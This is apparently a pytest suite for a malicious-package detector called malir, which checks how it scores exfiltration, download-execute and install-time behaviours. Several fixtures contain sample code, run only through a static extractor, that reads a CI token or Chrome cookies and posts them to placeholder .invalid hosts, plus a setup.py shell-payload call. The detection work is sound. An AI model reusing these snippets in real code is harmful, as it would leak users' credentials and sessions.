import pytest

from malir.detector import CascadeConfig, decide
from malir.extractor import PythonExtractor
from malir.model_tokens import canonicalize_model_tokens
from malir.policy import process_target_class
from malir.types import BehaviorPath, Event, FileAnalysis


def _event(
    op: str,
    line: int,
    function: str = "scan",
    path: str = "pkg.py",
    target: str = "x",
) -> Event:
    return Event(
        op=op,
        category="sink",
        target=target,
        path=path,
        line=line,
        column=0,
        function=function,
        phase="runtime",
        detail=op.lower(),
    )


def _analysis(
    events: list[Event],
    paths: list[BehaviorPath] | None = None,
    path: str = "pkg.py",
) -> FileAnalysis:
    return FileAnalysis(
        path=path,
        sha256="0" * 64,
        bytes_read=1,
        events=events,
        behavior_paths=paths or [],
    )


class _RecordingModel:
    def __init__(self, probability: float = 0.9) -> None:
        self.probability = probability
        self.calls: list[list[str]] = []

    def predict_proba(self, tokens: list[str]) -> float:
        self.calls.append(tokens)
        return self.probability


class _AbstainingModel:
    def predict_details(self, _tokens: list[str]) -> dict:
        return {
            "probability": 0.99,
            "supported": False,
            "token_coverage": 0.5,
            "nearest_similarity": 0.1,
            "unknown_tokens": ["O:UNKNOWN"],
        }


def _repeated_exfil_analysis(repeats: int) -> FileAnalysis:
    events = [
        _event("ENV_READ", 1, target="CI_TOKEN"),
        _event("ENCODE", 2, target="base64.b64encode"),
        *[
            _event(
                "NETWORK_SEND",
                3 + index,
                target=f"https://collector{index}.invalid/upload",
            )
            for index in range(repeats)
        ],
    ]
    paths = [
        BehaviorPath(
            motif="credential_or_file_exfil",
            score=2.0,
            reason="nearby only",
            event_indexes=(0, 2 + index),
            evidence_kind="proximity",
            confidence="low",
        )
        for index in range(repeats)
    ]
    return _analysis(events, paths)


def test_semantic_default_is_invariant_to_repeated_sink_spam():
    single = decide([_repeated_exfil_analysis(1)])
    spammed = decide([_repeated_exfil_analysis(20)])

    assert single.rule_score == 28.0
    assert spammed.rule_score == single.rule_score
    assert len(spammed.evidence) == 4
    assert (
        next(item for item in spammed.evidence if item.op == "NETWORK_SEND").occurrences
        == 20
    )
    assert (
        next(
            item
            for item in spammed.evidence
            if item.motif == "credential_or_file_exfil"
        ).occurrences
        == 20
    )


def test_model_input_is_semantically_compacted_before_inference():
    single_model = _RecordingModel()
    spam_model = _RecordingModel()
    single = decide([_repeated_exfil_analysis(1)], single_model)
    spammed = decide([_repeated_exfil_analysis(20)], spam_model)

    assert single_model.calls == spam_model.calls
    assert spammed.risk_score == pytest.approx(single.risk_score)
    assert spammed.model_consulted is True
    assert spammed.model_used is True


def test_model_is_consulted_but_advisory_outside_decision_gate():
    model = _RecordingModel(probability=0.99)
    result = decide([_analysis([])], model)

    assert model.calls == [[]]
    assert result.model_probability == 0.99
    assert result.model_consulted is True
    assert result.model_used is False
    assert result.risk_score == 0.0


def test_unsupported_model_probability_cannot_change_capability_score():
    result = decide([_analysis([_event("DYNAMIC_EXEC", 1)])], _AbstainingModel())

    assert result.rule_score == 27.0
    assert result.risk_score == result.rule_score
    assert result.model_probability == 0.99
    assert result.model_consulted is True
    assert result.model_used is False
    assert result.model_supported is False
    assert result.model_abstained is True
    assert result.model_token_coverage == 0.5
    assert result.model_nearest_similarity == 0.1
    assert result.model_unknown_tokens == ["O:UNKNOWN"]


def test_context_max_deduplicates_and_does_not_sum_functions():
    events = [
        _event("SENSITIVE_FILE_READ", 1, "upload"),
        _event("SENSITIVE_FILE_READ", 2, "upload"),
        _event("NETWORK_SEND", 3, "upload"),
        _event("ENCODE", 4, "upload"),
        _event("DYNAMIC_EXEC", 20, "runner"),
        _event("PROCESS_EXEC", 21, "runner"),
    ]
    paths = [
        BehaviorPath(
            motif="credential_or_file_exfil",
            score=36.0,
            reason="exact exfiltration flow",
            event_indexes=(0, 2),
            evidence_kind="dataflow",
            confidence="high",
        ),
        BehaviorPath(
            motif="credential_or_file_exfil",
            score=36.0,
            reason="duplicate exact flow",
            event_indexes=(1, 2),
            evidence_kind="dataflow",
            confidence="high",
        ),
    ]
    analysis = _analysis(events, paths)

    legacy = decide(
        [analysis],
        config=CascadeConfig(rule_aggregation="legacy-top8"),
    )
    candidate = decide(
        [analysis],
        config=CascadeConfig(rule_aggregation="context-max-v1"),
    )

    assert legacy.rule_score == 100.0
    assert candidate.rule_score == 67.0
    assert candidate.verdict == "suspicious"
    assert len(candidate.evidence) == 6
    assert (
        next(
            item for item in candidate.evidence if item.op == "SENSITIVE_FILE_READ"
        ).occurrences
        == 2
    )


def test_context_max_uses_maximum_context_instead_of_package_sum():
    analysis = _analysis(
        [
            _event("DYNAMIC_EXEC", 1, "first"),
            _event("DYNAMIC_EXEC", 2, "second"),
        ]
    )

    assert (
        decide(
            [analysis],
            config=CascadeConfig(rule_aggregation="legacy-top8"),
        ).rule_score
        == 54.0
    )
    assert (
        decide(
            [analysis],
            config=CascadeConfig(rule_aggregation="context-max-v1"),
        ).rule_score
        == 27.0
    )


def test_context_max_empty_analysis_scores_zero():
    result = decide(
        [_analysis([])],
        config=CascadeConfig(rule_aggregation="context-max-v1"),
    )
    assert result.rule_score == 0.0
    assert result.verdict == "low-signal"


def test_unknown_rule_aggregation_is_rejected():
    with pytest.raises(ValueError, match="unsupported rule aggregation"):
        decide(
            [_analysis([])],
            config=CascadeConfig(rule_aggregation="unknown"),  # type: ignore[arg-type]
        )


def test_context_cover_replaces_structural_events_instead_of_double_counting():
    analysis = _analysis(
        [_event("DYNAMIC_EXEC", 1), _event("FILE_DELETE", 2)],
        [
            BehaviorPath(
                motif="install_time_execution",
                score=30.0,
                reason="install execution",
                event_indexes=(0,),
                evidence_kind="structural",
                confidence="high",
            ),
            BehaviorPath(
                motif="destructive_file_action",
                score=18.0,
                reason="delete",
                event_indexes=(1,),
                evidence_kind="structural",
                confidence="high",
            ),
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-cover-v2")
    )
    assert result.rule_score == 48.0


def test_context_cover_exact_dataflow_summarizes_constituent_events():
    analysis = _analysis(
        [_event("ENV_READ", 1), _event("NETWORK_SEND", 2)],
        [
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=36.0,
                reason="exact exfiltration",
                event_indexes=(0, 1),
                evidence_kind="dataflow",
                confidence="high",
            )
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-cover-v2")
    )
    assert result.rule_score == 36.0


def test_context_cover_proximity_does_not_suppress_event_evidence():
    analysis = _analysis(
        [_event("ENV_READ", 1), _event("NETWORK_SEND", 2)],
        [
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=2.0,
                reason="nearby only",
                event_indexes=(0, 1),
                evidence_kind="proximity",
                confidence="low",
            )
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-cover-v2")
    )
    assert result.rule_score == 24.0


def test_context_cover_keeps_uncovered_occurrence_of_same_operation():
    analysis = _analysis(
        [_event("DYNAMIC_EXEC", 1), _event("DYNAMIC_EXEC", 2)],
        [
            BehaviorPath(
                motif="install_time_execution",
                score=30.0,
                reason="one covered exec",
                event_indexes=(0,),
                evidence_kind="structural",
                confidence="high",
            )
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-cover-v2")
    )
    assert result.rule_score == 57.0


def test_context_causal_v6_does_not_stack_unlinked_deserialization_and_exec():
    analysis = _analysis(
        [
            _event("PROCESS_EXEC", 1),
            _event("UNSAFE_DESERIALIZE", 2),
            _event("ENV_READ", 3),
            _event("FILE_WRITE", 4),
        ]
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-causal-v6")
    )
    assert result.rule_score == 35.0


def test_context_causal_v6_keeps_sensitive_and_remote_sources_additive():
    analysis = _analysis(
        [
            _event("PROCESS_EXEC", 1),
            _event("SENSITIVE_FILE_READ", 2),
            _event("NETWORK_RECEIVE", 3),
            _event("ENV_READ", 4),
        ]
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-causal-v6")
    )
    assert result.rule_score == 44.0


def test_context_causal_v6_preserves_deserialization_when_it_forms_a_path():
    analysis = _analysis(
        [_event("UNSAFE_DESERIALIZE", 1), _event("DYNAMIC_EXEC", 2)],
        [
            BehaviorPath(
                motif="encoded_execution",
                score=40.0,
                reason="exact flow",
                event_indexes=(0, 1),
                evidence_kind="dataflow",
                confidence="high",
            )
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-causal-v6")
    )
    assert result.rule_score == 40.0


def test_context_causal_v6_exact_motif_dominates_weak_same_motif_paths():
    analysis = _analysis(
        [
            _event("NETWORK_RECEIVE", 1),
            _event("PROCESS_EXEC", 2),
            _event("PROCESS_EXEC", 3),
        ],
        [
            BehaviorPath(
                motif="download_execute",
                score=42.0,
                reason="exact staged execution",
                event_indexes=(0, 1),
                evidence_kind="dataflow",
                confidence="high",
            ),
            BehaviorPath(
                motif="download_execute",
                score=4.0,
                reason="nearby process only",
                event_indexes=(0, 2),
                evidence_kind="proximity",
                confidence="low",
            ),
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-causal-v6")
    )
    assert result.rule_score == 42.0


def test_context_cover_summary_summarizes_constituent_events():
    analysis = _analysis(
        [_event("ENV_READ", 1), _event("NETWORK_SEND", 2)],
        [
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=36.0,
                reason="bounded direct-call summary",
                event_indexes=(0, 1),
                evidence_kind="summary",
                confidence="medium",
            )
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-cover-v2")
    )
    assert result.rule_score == 36.0


def test_context_causal_v6_summary_suppresses_weak_same_motif_path():
    analysis = _analysis(
        [_event("ENV_READ", 1), _event("NETWORK_SEND", 2)],
        [
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=36.0,
                reason="bounded direct-call summary",
                event_indexes=(0, 1),
                evidence_kind="summary",
                confidence="medium",
            ),
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=2.0,
                reason="nearby only",
                event_indexes=(0, 1),
                evidence_kind="proximity",
                confidence="low",
            ),
        ],
    )
    result = decide(
        [analysis], config=CascadeConfig(rule_aggregation="context-causal-v6")
    )
    assert result.rule_score == 36.0


def test_legacy_summary_does_not_stack_its_constituent_events():
    analysis = _analysis(
        [_event("ENV_READ", 1), _event("NETWORK_SEND", 2)],
        [
            BehaviorPath(
                motif="credential_or_file_exfil",
                score=36.0,
                reason="bounded direct-call summary",
                event_indexes=(0, 1),
                evidence_kind="summary",
                confidence="medium",
            )
        ],
    )

    assert (
        decide(
            [analysis],
            config=CascadeConfig(rule_aggregation="legacy-top8"),
        ).rule_score
        == 36.0
    )


def test_low_model_probability_cannot_erase_capability_floor():
    model = _RecordingModel(probability=0.0)
    result = decide([_analysis([_event("DYNAMIC_EXEC", 1)])], model)

    assert result.rule_score == 27.0
    assert result.model_used is True
    assert result.risk_score == result.rule_score
    assert result.verdict == "review"


def test_process_target_class_treats_whitespace_as_generic():
    assert process_target_class("   ") == "generic"


def test_model_tokens_distinguish_install_process_target_classes():
    compiler = _RecordingModel()
    shell = _RecordingModel()
    interpreter = _RecordingModel()
    decide(
        [PythonExtractor().analyze_source("os.system('gcc --version')\n", "setup.py")],
        compiler,
    )
    decide(
        [PythonExtractor().analyze_source("os.system('sh payload.sh')\n", "setup.py")],
        shell,
    )
    decide(
        [
            PythonExtractor().analyze_source(
                "subprocess.run(['python', 'build.py'])\n", "setup.py"
            )
        ],
        interpreter,
    )
    assert "P:install|C:sink|O:PROCESS_EXEC|T:process_compiler" in compiler.calls[0]
    assert "P:install|C:sink|O:PROCESS_EXEC|T:process_shell" in shell.calls[0]
    assert (
        "P:install|C:sink|O:PROCESS_EXEC|T:process_interpreter" in interpreter.calls[0]
    )
    assert compiler.calls != shell.calls
    assert shell.calls != interpreter.calls


def test_model_tokens_distinguish_temporary_and_user_data_delete_targets():
    temporary = _RecordingModel()
    user_data = _RecordingModel()
    decide(
        [PythonExtractor().analyze_source("def f():\n    os.remove('cache.tmp')\n")],
        temporary,
    )
    decide(
        [
            PythonExtractor().analyze_source(
                "def f():\n    os.remove('user_documents')\n"
            )
        ],
        user_data,
    )
    assert "P:runtime|C:sink|O:FILE_DELETE|T:delete_temporary" in temporary.calls[0]
    assert "P:runtime|C:sink|O:FILE_DELETE|T:delete_user_data" in user_data.calls[0]
    assert temporary.calls != user_data.calls


def test_model_tokens_ignore_filename_and_concrete_network_target():
    first = _RecordingModel()
    second = _RecordingModel()
    decide(
        [
            _analysis(
                [_event("NETWORK_SEND", 1, target="https://one.invalid")], path="one.py"
            )
        ],
        first,
    )
    decide(
        [
            _analysis(
                [_event("NETWORK_SEND", 1, target="https://two.invalid")],
                path="renamed.py",
            )
        ],
        second,
    )

    assert first.calls == second.calls


def test_model_input_preserves_path_evidence_strength():
    unrelated = PythonExtractor().analyze_source(
        """
import os
import requests

def collect():
    secret = os.getenv("CI_TOKEN")
    harmless = "hello"
    requests.post("https://example.invalid/telemetry", data=harmless)
""",
        "unrelated.py",
    )
    exact = PythonExtractor().analyze_source(
        """
import os
import requests

def collect():
    secret = os.getenv("CI_TOKEN")
    requests.post("https://example.invalid/collect", data=secret)
""",
        "exact.py",
    )
    unrelated_model = _RecordingModel()
    exact_model = _RecordingModel()
    decide([unrelated], unrelated_model)
    decide([exact], exact_model)

    assert unrelated_model.calls != exact_model.calls
    assert "PATH:credential_or_file_exfil|K:proximity|Q:low" in unrelated_model.calls[0]
    assert "PATH:credential_or_file_exfil|K:dataflow|Q:high" in exact_model.calls[0]
    assert "EFFECT:FLOW:sensitive_data_to_network" not in unrelated_model.calls[0]
    assert "EFFECT:FLOW:sensitive_data_to_network" in exact_model.calls[0]


def test_training_canonicalization_matches_scan_model_sequence():
    source = """
import base64
import os
import requests


def collect():
    secret = os.getenv("CI_TOKEN")
    payload = base64.b64encode(secret.encode())
    requests.post("https://example.invalid/collect", data=payload)
"""
    analysis = PythonExtractor().analyze_source(source, "collector.py")
    model = _RecordingModel()

    decide([analysis], model)

    assert model.calls == [canonicalize_model_tokens(analysis.tokens)]


def test_context_causal_scores_browser_session_transfer_by_evidence_strength():
    config = CascadeConfig(rule_aggregation="context-causal-v6")
    cookie_only = PythonExtractor().analyze_source(
        "import browser_cookie3\ncookies = browser_cookie3.chrome()\n",
        "cookies.py",
    )
    unrelated = PythonExtractor().analyze_source(
        "import browser_cookie3, requests\n"
        "cookies = browser_cookie3.chrome()\n"
        'requests.post("https://x.invalid", json={"event": "startup"})\n',
        "cookies.py",
    )
    exact = PythonExtractor().analyze_source(
        "import browser_cookie3, requests\n"
        "cookies = browser_cookie3.chrome()\n"
        'requests.post("https://x.invalid", json={"cookies": str(cookies)})\n',
        "cookies.py",
    )
    assert decide([cookie_only], config=config).rule_score == 12
    assert decide([unrelated], config=config).rule_score == 17
    assert decide([exact], config=config).rule_score == 36


def test_context_causal_marks_install_time_network_access_without_runtime_uplift():
    config = CascadeConfig(rule_aggregation="context-causal-v6")
    install = PythonExtractor().analyze_source(
        'import requests\nrequests.get("https://example.invalid")\n',
        "setup.py",
    )
    runtime = PythonExtractor().analyze_source(
        'import requests\nrequests.get("https://example.invalid")\n',
        "runtime.py",
    )
    install_paths = [
        path
        for path in install.behavior_paths
        if path.motif == "install_time_network_access"
    ]
    assert len(install_paths) == 1
    assert install_paths[0].evidence_kind == "structural"
    assert install_paths[0].confidence == "high"
    assert decide([install], config=config).rule_score == 20
    assert decide([runtime], config=config).rule_score == 7
    assert not any(
        path.motif == "install_time_network_access" for path in runtime.behavior_paths
    )
